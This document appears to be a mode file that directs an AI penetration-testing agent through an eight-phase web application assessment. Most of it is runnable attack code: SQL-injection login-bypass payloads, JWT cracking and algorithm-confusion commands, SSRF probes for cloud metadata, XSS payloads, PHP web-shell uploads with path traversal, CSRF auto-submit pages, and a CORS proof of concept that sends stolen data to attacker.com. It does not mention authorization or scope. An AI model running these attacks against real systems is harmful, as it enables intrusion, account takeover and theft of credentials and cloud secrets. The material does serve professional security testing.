---
name: standard
description: Structured full-coverage security assessment — advisory 8-phase workflow, think-tool-before-every-decision, UI-driven exploration, multi-user cross-session IDOR validation, mandatory raw HTTP evidence, and anti-false-positive enforcement
---

# Standard Testing Mode — Systematic, Rigorous, Complete, Evidence-Driven

Standard mode provides full attack surface coverage with rigorous validation. It is the baseline for professional penetration testing engagements. Every endpoint tested. Every finding proven end-to-end. Every report contains complete raw HTTP evidence. Deepen wherever the surface warrants.

---

## CORE STANDARDS — NEVER RELAXED IN STANDARD MODE

STANDARD 1: THINK TOOL MANDATORY — use it before reporting any vulnerability, before calling agent_finish, before concluding any endpoint is clean.

STANDARD 2: RAW HTTP MANDATORY — every vulnerability report MUST include the COMPLETE raw HTTP request (all headers + full body) AND the COMPLETE raw HTTP response (status + all headers + full body up to 2000 chars).

STANDARD 3: DEEPEN WHERE WARRANTED — after the first pass, spawn follow-up agents for endpoints with anomalies or hints of weakness; finish once the surface is exhausted, not after a fixed number of passes.

STANDARD 4: UI FIRST — navigate the application as a real user before testing the API.

STANDARD 5: REAL EXPLOITATION ONLY — no theoretical findings, no scanner-only findings. Every report requires demonstrated end-to-end exploitation with tangible output.

STANDARD 6: CORS ON SENSITIVE ENDPOINTS ONLY — FORBIDDEN to test or report CORS on any public/unauthenticated endpoint or endpoint that doesn't return sensitive data.

STANDARD 7: XSS REQUIRES BROWSER EXECUTION — a payload that reflects in HTML source without confirmed browser execution is NOT XSS. FORBIDDEN to report it as such.

STANDARD 8: IDOR REQUIRES ACTUAL DATA — "200 OK from User B" is NOT IDOR. User B's response body MUST contain User A's actual private data fields.

STANDARD 9: VERIFY RESPONSE ORIGIN — before treating any response as evidence, confirm it actually came from the host/subdomain you intended to test. Multi-host targets (e.g. `api.example.com` vs `example.com`) can silently misroute, and a proxy/CDN can serve a stale cached response; check that the actual request URL + `Host` header match the intended target before drawing any conclusion.

---

## Phase 0: Recon & Documentation — MANDATORY FIRST

### Documentation Discovery
FORBIDDEN to begin testing before reading all available documentation.

```bash
# Probe all documentation paths
for path in /robots.txt /sitemap.xml /swagger.json /swagger.yaml /swagger-ui.html \
            /openapi.json /openapi.yaml /api-docs /api/docs /v1/docs /v2/docs \
            /redoc /graphql /api/graphql /.well-known/openid-configuration \
            /api/schema /schema.json; do
  status=$(curl -so /dev/null -w "%{http_code}" "https://target.com${path}")
  [[ "$status" != "404" ]] && echo "FOUND: ${path} (${status})" | tee -a /workspace/doc_hits.txt
done

# Download and parse any found API spec
# Extract ALL endpoints and parameters from spec
# Record every endpoint in /workspace/endpoint_checklist.md
```

### Technology Detection
```bash
# WAF detection — critical for choosing attack approach
wafw00f https://target.com -v | tee /workspace/waf_detection.txt

# Technology fingerprinting
httpx -u https://target.com -title -tech-detect -status-code | tee /workspace/tech_stack.txt
# For EVERY detected product + version → web_search known CVEs/advisories for that
# exact version (complements nuclei; catches issues newer than local templates).

# JS analysis for endpoints and secrets
katana -u https://target.com -jc -d 5 -o /workspace/crawl_results.txt
# Download and analyze JS bundles
for jsfile in $(grep "\.js$" /workspace/crawl_results.txt); do
  wget -q "$jsfile" -P /workspace/js_files/
done
js-beautify /workspace/js_files/*.js -o /workspace/js_beautified/ 2>/dev/null
grep -rhoE "['\"`](/[a-z0-9_/-]{3,})['\"`]" /workspace/js_beautified/ \
  | grep -E "/(api|v[0-9]|auth|admin|user)" | sort -u > /workspace/js_endpoints.txt
trufflehog filesystem /workspace/js_files/ --json > /workspace/secrets_scan.json

# Subdomain enumeration
subfinder -d target.com -all -o /workspace/subdomains.txt
httpx -l /workspace/subdomains.txt -title -tech-detect -status-code \
  -o /workspace/live_subdomains.txt

# Directory discovery
ffuf -u https://target.com/FUZZ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -mc 200,204,301,302,307,401,403 -t 50 \
  -o /workspace/dirscan.json -of json
```

### Build Endpoint Checklist (MANDATORY)
Create /workspace/endpoint_checklist.md with EVERY discovered endpoint before any testing starts.

---

## Phase 1: Pre-Authentication Testing

### Mandatory UI Walkthrough
Open browser. Navigate to target. Click every visible element. Document every public page and form. Record all network requests via proxy. Take screenshots.

### Critical Pre-Auth Tests

**Login Bypass:**
```python
# SQLi in ALL login fields — test email, username, AND password fields
import requests

sqli_payloads = [
    "' OR '1'='1'--",
    "admin'--",
    "' OR 1=1#",
    '" OR "1"="1"--',
    "admin'/*",
]

for payload in sqli_payloads:
    r = requests.post("https://target.com/api/auth/login",
        json={"email": payload, "password": "anything"})
    if r.status_code == 200 and "token" in r.text:
        print(f"LOGIN BYPASS FOUND: {payload}")
        print(f"Response: {r.text[:500]}")
```

**Registration Mass Assignment:**
```python
# Try adding privileged fields to registration
registration_body = {
    "email": "test@test.com",
    "password": "TestPass123!",
    "username": "testuser",
    # Mass assignment attempts:
    "role": "admin",
    "isAdmin": True,
    "is_admin": True,
    "verified": True,
    "emailVerified": True,
    "status": "active",
    "privilege": 9,
    "permissions": ["admin"]
}
r = requests.post("https://target.com/api/auth/register", json=registration_body)
# Check if role/isAdmin fields were accepted and reflected in response
```

**Password Reset Host Header Injection:**
```python
# Test if reset email uses Host header value as the link base
reset_requests_to_test = [
    {"Host": "attacker.com"},
    {"X-Forwarded-Host": "attacker.com"},
    {"X-Host": "attacker.com"},
    {"X-Forwarded-Server": "attacker.com"},
]

for headers in reset_requests_to_test:
    r = requests.post("https://target.com/api/auth/forgot-password",
        json={"email": "victim@target.com"},
        headers={**headers, "Content-Type": "application/json"})
    print(f"Host injection test with {headers}: {r.status_code}")
    # If email is received at your test account: check if link contains attacker.com
```

**Rate Limiting — Demonstrate Viability:**
```python
import asyncio, aiohttp
from collections import Counter

async def test_rate_limit_comprehensive(url, payload, attempts=200):
    """
    CRITICAL: Only report rate limit absence as HIGH if:
    1. No rate limiting (no 429s after N attempts) AND
    2. No account lockout (same account responds after 200+ wrong attempts)
    """
    async with aiohttp.ClientSession() as session:
        tasks = [
            session.post(url, json={**payload, "password": f"wrong{i}"})
            for i in range(attempts)
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
    
    statuses = Counter(r.status for r in results if hasattr(r, 'status'))
    blocked = statuses.get(429, 0) + statuses.get(403, 0)
    
    print(f"Rate limit test ({attempts} attempts):")
    print(f"Status distribution: {dict(statuses)}")
    print(f"Blocked: {blocked}/{attempts}")
    
    if blocked == 0:
        print("No rate limiting detected")
        # Now test for account lockout — try the REAL password at attempt #201
        r_final = requests.post(url, json=payload)  # real password
        if r_final.status_code == 200:
            print("✅ HIGH SEVERITY: No rate limit AND no lockout — brute force viable")
        else:
            print(f"Account may be locked after {attempts} attempts: {r_final.status_code}")
            print("LOW severity: lockout compensates for missing rate limit")
    else:
        print(f"Rate limit active — severity is LOW")

asyncio.run(test_rate_limit_comprehensive(
    "https://target.com/api/auth/login",
    {"email": "user@target.com", "password": "correct_password"},
    attempts=200
))
```

**Username Enumeration:**
```python
import time, statistics

def test_username_enumeration(endpoint, valid_user, invalid_user, attempts=5):
    valid_times, invalid_times = [], []
    valid_msgs, invalid_msgs = [], []
    
    for _ in range(attempts):
        t = time.time()
        r = requests.post(endpoint, json={"email": valid_user, "password": "wrongpassword"})
        valid_times.append(time.time() - t)
        valid_msgs.append(r.text[:100])
        
        t = time.time()
        r = requests.post(endpoint, json={"email": invalid_user, "password": "wrongpassword"})
        invalid_times.append(time.time() - t)
        invalid_msgs.append(r.text[:100])
    
    avg_valid = statistics.mean(valid_times)
    avg_invalid = statistics.mean(invalid_times)
    
    time_diff = abs(avg_valid - avg_invalid)
    msg_diff = set(valid_msgs) != set(invalid_msgs)
    
    print(f"Valid user avg: {avg_valid:.3f}s | Invalid user avg: {avg_invalid:.3f}s")
    print(f"Time difference: {time_diff:.3f}s ({'SIGNIFICANT' if time_diff > 0.1 else 'not significant'})")
    print(f"Message difference: {msg_diff}")
    if msg_diff:
        print(f"Valid messages: {set(valid_msgs)}")
        print(f"Invalid messages: {set(invalid_msgs)}")
```

---

## Phase 2: Authentication & Multi-User Setup

### Account Creation — UI ONLY (Screenshots Required)
```
1. Browser → /register → fill User A details → screenshot every step → complete onboarding
2. Browser → /register → fill User B details → screenshot every step → complete onboarding
3. Capture session data for BOTH users and save to /workspace/auth_tokens.md:
   - All cookies with flags (SameSite, HttpOnly, Secure, Path, Domain)
   - JWT token (decode with jwt_tool, record header + payload)
   - CSRF token
   - API keys (if any)
4. Try admin creation: /admin/register, default creds (admin/admin, admin/password)
```

### JWT Security Testing
```bash
USER_TOKEN="[paste JWT here]"

# Decode and analyze
python3 -c "
import base64, json
parts = '${USER_TOKEN}'.split('.')
header = json.loads(base64.b64decode(parts[0] + '==='))
payload = json.loads(base64.b64decode(parts[1] + '==='))
print('Header:', json.dumps(header, indent=2))
print('Payload:', json.dumps(payload, indent=2))
"

# Test none algorithm
python3 /home/pentester/tools/jwt_tool/jwt_tool.py "${USER_TOKEN}" -X a

# Test weak secret brute force
python3 /home/pentester/tools/jwt_tool/jwt_tool.py "${USER_TOKEN}" -C \
  -d /usr/share/wordlists/rockyou.txt

# RS256 to HS256 confusion (fetch public key first)
JWKS=$(curl -s "https://target.com/.well-known/jwks.json")
if [[ "$JWKS" != "" ]]; then
    echo "${JWKS}" > /workspace/jwks.json
    python3 /home/pentester/tools/jwt_tool/jwt_tool.py "${USER_TOKEN}" \
      -X k -pk /workspace/public_key.pem
fi
```

### User A Resource Population
Create resources as User A — record ALL resource IDs to /workspace/user_a_resources.md:
- Post/message/note with specific private content
- Uploaded file
- API key
- Any other object the application supports

---

## Phase 3: Full Authenticated UI Exploration — HIGHEST PRIORITY

### Complete Feature Discovery
FORBIDDEN to begin vulnerability testing before completing UI exploration.

```
For EVERY page, tab, and feature:
1. Screenshot initial state
2. Click every button, link, tab, menu item, dropdown, toggle
3. Open every modal, dialog, tooltip, drawer
4. Fill every form → submit → record HTTP request → add endpoint to checklist
5. Try both valid input and edge cases (empty, very long, special chars)
6. Capture all network requests via proxy
7. Add ALL newly discovered endpoints to /workspace/endpoint_checklist.md
```

### SPA routes & UI ledger
SPAs hide routes with no visible link — dump the router table via execute_js
(window.__NEXT_DATA__ / $router.getRoutes() / grep bundle for path:"…") and `goto`
each link-less route per role. Log every seen-but-unopened tab/modal/route to
/workspace/ui_surface.md as `[ ] pending`; not UI-complete until all are `[x]`.
Every link-less route you discover AND every API request it fires when you `goto` it
→ add to /workspace/endpoint_checklist.md as well, not only ui_surface.md. The two
ledgers are not interchangeable: ui_surface.md tracks whether a section was visited;
endpoint_checklist.md tracks whether its endpoints were tested. A route is done only
when it is `[x]` in both. Same for each multi-step-form step's endpoint.

### State-Changing Actions — Complete ALL
Execute through UI and capture full HTTP request/response for each:
1. Create a resource → IMMEDIATELY test IDOR with User B after creation
2. Edit a resource → test parameter injection in all editable fields
3. Delete a resource
4. Send a message to User B
5. Upload a file (images, documents, try various types)
6. Change profile (name, email, password, avatar, bio)
7. Generate API key or access token
8. Export data (CSV, PDF, ZIP)
9. Change privacy/security settings
10. Invite/share with another user

After every creation action: immediately add the new resource URL to endpoint_checklist.md and test IDOR.

### Admin Panel Discovery
```bash
for path in /admin /administrator /manage /panel /control /cp /backend \
            /cms /staff /internal /ops /superadmin /system /backstage; do
  r=$(curl -so /dev/null -w "%{http_code}" -H "Cookie: ${USER_A_COOKIE}" \
      "https://target.com${path}")
  echo "${path}: ${r}"
done
```

---

## Phase 4: Cross-User IDOR & Privilege Escalation

### IDOR Testing Protocol — Response Body Verification Required

```python
import requests, json

def test_idor_standard(resource_url, resource_id, user_a_data, user_b_cookie):
    """
    Standard IDOR test with response body verification.
    
    CRITICAL RULE: 200 OK is NOT proof of IDOR.
    Proof = User B's response contains User A's ACTUAL private data fields.
    """
    # Step 1: Know what User A's data looks like
    print(f"\nTesting IDOR: {resource_url}/{resource_id}")
    print(f"User A's identifying data: {user_a_data}")
    
    # Step 2: Access with User B's session
    user_b_resp = requests.get(
        f"{resource_url}/{resource_id}",
        headers={"Cookie": f"session={user_b_cookie}"},
    )
    
    print(f"User B HTTP Status: {user_b_resp.status_code}")
    
    if user_b_resp.status_code != 200:
        print(f"✅ Properly blocked: {user_b_resp.status_code}")
        return False
    
    body = user_b_resp.text
    
    # Step 3: Check if response contains User A's actual private data
    for field, value in user_a_data.items():
        if str(value) in body:
            print(f"✅ IDOR CONFIRMED: User B sees User A's '{field}': '{value}'")
            
            # Print raw HTTP evidence
            print(f"\n--- COMPLETE RAW HTTP REQUEST (User B) ---")
            print(f"GET {resource_url}/{resource_id} HTTP/1.1")
            print(f"Host: target.com")
            print(f"Cookie: session={user_b_cookie[:30]}...  ← USER B'S SESSION")
            
            print(f"\n--- COMPLETE RAW HTTP RESPONSE ---")
            print(f"HTTP/1.1 {user_b_resp.status_code} OK")
            for h, v in user_b_resp.headers.items():
                print(f"{h}: {v}")
            print(f"\n{body[:1000]}")
            print(f"[Contains User A's {field}: '{value}' ← PROOF OF IDOR]")
            
            return True, {field: value}, body
    
    print(f"NOT IDOR: 200 OK but User A's private data NOT in response body")
    print(f"Response preview: {body[:200]}")
    return False

# Run for ALL User A resources × ALL HTTP methods
for resource_id, resource_url in load_user_a_resources().items():
    for method in ["GET", "PUT", "PATCH", "DELETE"]:
        r = requests.request(method,
            f"{resource_url}/{resource_id}",
            headers={"Cookie": f"session={USER_B_COOKIE}",
                     "Content-Type": "application/json"},
            json={"data": "User B modification attempt"})
        print(f"{method} {resource_url}/{resource_id}: {r.status_code}")
```

### Vertical Privilege Escalation
```python
# Test admin endpoints with regular user session
admin_endpoints = ["/api/admin/users", "/api/admin/settings", "/api/admin/roles",
                   "/api/admin/impersonate", "/api/admin/logs"]

for endpoint in admin_endpoints:
    r = requests.get(f"https://target.com{endpoint}",
        headers={"Cookie": USER_A_COOKIE})
    print(f"{endpoint}: {r.status_code}")
    if r.status_code == 200:
        print(f"⚠️ POTENTIAL PRIVILEGE ESCALATION: {endpoint} accessible by regular user")
        print(f"Response: {r.text[:300]}")
```

---

## Phase 5: Systematic Vulnerability Testing

### SQL Injection
First confirm the stack is SQL-backed and reduce the request list to params showing signal (DB-typical names, or error/reflection). Do NOT sqlmap every captured request blindly.
```bash
# Automated scan (--smart runs heavy tests only on params with heuristic signal)
sqlmap -l /workspace/proxy_requests.txt \
  --batch --smart --level=3 --risk=2 \
  --tamper=space2comment,between \
  --technique=BEUST \
  --output-dir=/workspace/sqlmap_results/

# Manual high-value targets
# Test login form, search, filter, sort, ID parameters
```

Time-based confirmation (5x required):
```python
def confirm_time_based_sqli_5x(url, param, payload, normal_value):
    times_normal, times_injected = [], []
    
    for i in range(5):
        import time, requests
        t = time.time(); requests.get(url, params={param: normal_value})
        times_normal.append(time.time() - t)
        
        t = time.time(); requests.get(url, params={param: payload})
        times_injected.append(time.time() - t)
    
    import statistics
    print(f"Normal times: {[f'{t:.2f}' for t in times_normal]} | avg={statistics.mean(times_normal):.2f}s")
    print(f"Injected times: {[f'{t:.2f}' for t in times_injected]} | avg={statistics.mean(times_injected):.2f}s")
    
    if statistics.mean(times_injected) > statistics.mean(times_normal) + 4.5:
        print("✅ TIME-BASED SQLI CONFIRMED (5x consistent delay)")
        return True
    return False
```

### XSS — All Contexts with Browser Execution Confirmation
```python
from playwright.sync_api import sync_playwright

def test_xss_and_confirm(url, param, context="html_body"):
    payloads = {
        "html_body": '<img src=x onerror=alert(document.domain)>',
        "attribute": '" autofocus onfocus="alert(document.domain)" x="',
        "js_string": '"-alert(document.domain)-"',
        "url": 'javascript:alert(document.domain)',
        "svg": '<svg onload=alert(document.domain)>',
    }
    
    payload = payloads.get(context, payloads["html_body"])
    
    # Step 1: Check if payload reflects unencoded
    r = requests.get(url, params={param: payload})
    if payload in r.text:
        print(f"Payload reflects unencoded in context: {context}")
        
        # Step 2: MANDATORY browser execution confirmation
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            page = browser.new_page()
            executed = {"value": False}
            
            page.on("dialog", lambda d: (
                executed.__setitem__("value", True),
                print(f"✅ XSS CONFIRMED: alert({d.message}) executed!"),
                d.accept()
            ))
            
            test_url = f"{url}?{param}={requests.utils.quote(payload)}"
            page.goto(test_url, timeout=10000)
            page.wait_for_timeout(3000)
            browser.close()
            
            if not executed["value"]:
                print("❌ Reflects in HTML source but DID NOT execute — NOT XSS, discarding")
                return False
            return True
    else:
        print(f"Payload encoded in response — NOT XSS")
        return False
```

### SSRF — Progressive Testing
```python
# Test all URL-accepting parameters
url_params = find_url_parameters_from_proxy()

for endpoint, param in url_params:
    # Start with OOB DNS (confirms injection but = Low/Info only)
    oast_url = f"http://{get_interactsh_id()}.oast.fun/ssrf-{param}"
    r = requests.post(endpoint, json={param: oast_url},
        headers={"Cookie": USER_A_COOKIE})
    print(f"OOB test on {param}: {r.status_code}")
    
    # If any signal → escalate to cloud metadata
    cloud_targets = [
        "http://169.254.169.254/latest/meta-data/",  # AWS
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
    ]
    for target in cloud_targets:
        r = requests.post(endpoint, json={param: target},
            headers={"Cookie": USER_A_COOKIE,
                     "Metadata-Flavor": "Google"})  # GCP requirement
        if r.status_code == 200 and len(r.text) > 10:
            print(f"✅ SSRF HIGH: Cloud metadata accessed via {param}")
            print(f"Response: {r.text[:500]}")
```

### CORS — Sensitive Endpoints ONLY
```python
# Step 1: Find sensitive endpoints
sensitive_endpoints = []
for endpoint in authenticated_endpoints:
    r = requests.get(endpoint, headers={"Cookie": USER_A_COOKIE})
    if any(kw in r.text.lower() for kw in 
           ["email", "phone", "token", "key", "payment", "private", "message", "password"]):
        sensitive_endpoints.append(endpoint)
        print(f"Sensitive: {endpoint}")

# Step 2: Test CORS ONLY on sensitive endpoints
for endpoint in sensitive_endpoints:
    r = requests.get(endpoint, headers={
        "Cookie": USER_A_COOKIE,
        "Origin": "https://attacker.com"
    })
    acao = r.headers.get("Access-Control-Allow-Origin", "")
    acac = r.headers.get("Access-Control-Allow-Credentials", "")
    
    if "attacker.com" in acao and acac.lower() == "true":
        print(f"✅ EXPLOITABLE CORS: {endpoint}")
        print(f"ACAO: {acao}, ACAC: {acac}")
        # Build exfiltration PoC
        poc = f'<script>fetch("{endpoint}",{{credentials:"include"}}).then(r=>r.text()).then(d=>fetch("https://attacker.com/?data="+btoa(d)))</script>'
        print(f"PoC: {poc}")
```

### CSRF — State-Changing Endpoints
```python
# Test each state-changing endpoint
state_changing_endpoints = [
    ("POST", "/api/user/change-email", {"email": "attacker@evil.com"}),
    ("POST", "/api/user/change-password", {"new_password": "hacked123"}),
    ("DELETE", "/api/user/account", {}),
    ("POST", "/api/keys/generate", {"name": "attacker_key"}),
]

for method, endpoint, payload in state_changing_endpoints:
    # Test 1: Remove CSRF token
    r = requests.request(method, f"https://target.com{endpoint}",
        json=payload,
        headers={"Cookie": USER_A_COOKIE,
                 "Origin": "https://attacker.com",
                 "Referer": "https://attacker.com"})
    print(f"CSRF test {endpoint}: {r.status_code}")
    
    if r.status_code == 200:
        # Build working PoC
        poc_html = f"""
<html>
<body>
  <form id="csrf" method="{method}" action="https://target.com{endpoint}" enctype="application/json">
    <input type="hidden" name="json" value='{json.dumps(payload)}'>
  </form>
  <script>document.getElementById("csrf").submit();</script>
</body>
</html>"""
        print(f"✅ CSRF CONFIRMED: Build PoC at attacker.com/poc.html")
        print(poc_html)
```

### File Upload Testing
```python
# Test every upload endpoint
def test_file_upload(upload_url, file_field, session_cookie):
    test_files = [
        # Web shell bypass attempts
        ("shell.php", b"<?php system($_GET['cmd']); ?>", "image/jpeg"),
        ("shell.php5", b"<?php system($_GET['cmd']); ?>", "image/jpeg"),
        ("shell.phtml", b"<?php system($_GET['cmd']); ?>", "image/jpeg"),
        ("shell.PHP", b"<?php system($_GET['cmd']); ?>", "application/octet-stream"),
        # SVG XSS
        ("xss.svg", b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>', "image/svg+xml"),
        # HTML XSS
        ("xss.html", b'<script>alert(document.domain)</script>', "text/html"),
        # Path traversal in filename
        ("../../../webroot/shell.php", b"<?php system('id'); ?>", "image/jpeg"),
    ]
    
    for filename, content, mime_type in test_files:
        r = requests.post(upload_url,
            files={file_field: (filename, content, mime_type)},
            headers={"Cookie": session_cookie})
        print(f"Upload {filename} ({mime_type}): {r.status_code}")
        
        # If upload succeeds, check if file is accessible and executable
        if r.status_code in [200, 201]:
            file_url = extract_file_url(r)
            if file_url:
                exec_test = requests.get(f"{file_url}?cmd=id")
                if exec_test.status_code == 200 and "uid=" in exec_test.text:
                    print(f"✅ RCE VIA FILE UPLOAD: {file_url}")
                    print(f"Command execution: {exec_test.text[:200]}")
```

### Business Logic
```python
# Step skipping
def test_workflow_step_skipping():
    s = requests.Session()
    s.cookies.set("session", USER_A_COOKIE)
    
    # Start at step 1
    r1 = s.post("https://target.com/api/checkout/start",
        json={"cart_id": "CART_123"})
    print(f"Step 1 (cart): {r1.status_code}")
    
    # Skip straight to final confirmation
    r_skip = s.post("https://target.com/api/checkout/confirm",
        json={"cart_id": "CART_123", "payment": {"type": "skip"}})
    print(f"Skip to confirm: {r_skip.status_code}")
    if r_skip.status_code == 200:
        print("✅ WORKFLOW BYPASS: Order confirmed without payment!")

# Race condition test
async def test_race_condition_standard(url, payload, n=15):
    import asyncio, aiohttp
    async with aiohttp.ClientSession() as session:
        results = await asyncio.gather(*[
            session.post(url, json=payload,
                headers={"Cookie": USER_A_COOKIE})
            for _ in range(n)
        ])
    statuses = [r.status for r in results]
    from collections import Counter
    print(f"Race condition ({n} simultaneous): {dict(Counter(statuses))}")
    if Counter(statuses).get(200, 0) > 1:
        print("⚠️ POSSIBLE RACE CONDITION: Multiple success responses")
```

---

## Phase 6: Post-Logout Session Testing

```python
# After logout:
requests.post("https://target.com/api/auth/logout",
    headers={"Cookie": USER_A_COOKIE})

# Test all captured tokens
for token_type, token_value in [
    ("cookie", USER_A_COOKIE),
    ("jwt", USER_A_JWT),
    ("api_key", USER_A_API_KEY)
]:
    r = requests.get("https://target.com/api/user/profile",
        headers={"Cookie": token_value} if token_type == "cookie"
        else {"Authorization": f"Bearer {token_value}"})
    
    status = "VALID (VULNERABILITY)" if r.status_code == 200 else "properly invalidated"
    print(f"{token_type} after logout: {r.status_code} — {status}")
```

---

## Phase 7: Second-Pass Deepening

After Pass 1 completes, use think tool to identify:
- Endpoints that returned anomalies but weren't fully exploited
- Endpoints that resisted basic techniques (try bypass techniques now)
- Endpoints discovered during testing that need testing

Spawn Pass 2 agents for each area with instructions:
```
"This is Pass 2. Pass 1 results: [summary].

Apply techniques NOT used in Pass 1:
1. WAF bypass: URL encoding, double encoding, comment injection
2. 403 bypass: X-Original-URL, X-Rewrite-URL, path normalization
3. Method override for blocked endpoints
4. Parameter pollution
5. Second-order injection on injection points that showed hints
6. JWT key confusion if RS256 is in use
7. More aggressive SSRF probing on any hint of SSRF"
```

---

## Mandatory Real Impact Gate — Think Tool Required

Before ANY vulnerability is reported, use the think tool to answer:

```
1. Did I prove this end-to-end with tangible output?
   - XSS: browser executed the payload (not just reflected)
   - IDOR: User B's response body contains User A's actual private data field [quote it]
   - SQLi: database version or table name extracted [quote it]
   - SSRF: internal service accessed or cloud metadata retrieved [quote it]
   - CSRF: state change completed cross-origin [show before/after state]

2. Do I have TWO independent confirmation signals?
   Signal 1: [specific evidence]
   Signal 2: [independent evidence]

3. Is this a false positive I should reject?
   - CORS on non-sensitive endpoint → REJECT
   - XSS reflecting but not executing → REJECT
   - 200 OK from User B without User A's data → NOT IDOR, REJECT
   - DNS-only SSRF → Low/Info ONLY
   - Missing headers → Low/Info ONLY

4. Is my raw HTTP evidence complete?
   Complete request captured: YES/NO
   Complete response captured: YES/NO

5. Business impact: "An attacker can [SPECIFIC] which results in [SPECIFIC] affecting [SPECIFIC]"
```

---

## Reporting Requirements — All 11 Sections + Raw HTTP

Every vulnerability report via create_vulnerability_report MUST include in technical_analysis:

```
COMPLETE RAW HTTP REQUEST:
[METHOD] [PATH] HTTP/1.1
Host: [target]
[ALL HEADERS]

[COMPLETE BODY — ← VULNERABLE PARAMETER marked]

COMPLETE RAW HTTP RESPONSE:
HTTP/1.1 [status]
[ALL HEADERS]

[COMPLETE BODY — ← PROOF OF EXPLOITATION marked]
```

Missing the raw HTTP request or response = INCOMPLETE REPORT = DO NOT SUBMIT.

---

## Standard Mode Completion Checklist

Before calling agent_finish, use think tool to verify ALL:
```
[ ] The attack surface has been mapped and exhausted (no new surface/findings emerging)
[ ] /workspace/endpoint_checklist.md updated for all tested endpoints
[ ] Every confirmed finding: 2+ independent signals
[ ] Every report: complete raw HTTP request AND response
[ ] Every report: all 11 mandatory sections
[ ] No false positives: DNS-only SSRF=Low, missing headers=Low, CORS on public=rejected
[ ] No XSS reported without browser execution
[ ] No IDOR reported without User A's data in User B's response
[ ] Business impact stated specifically for every finding
```
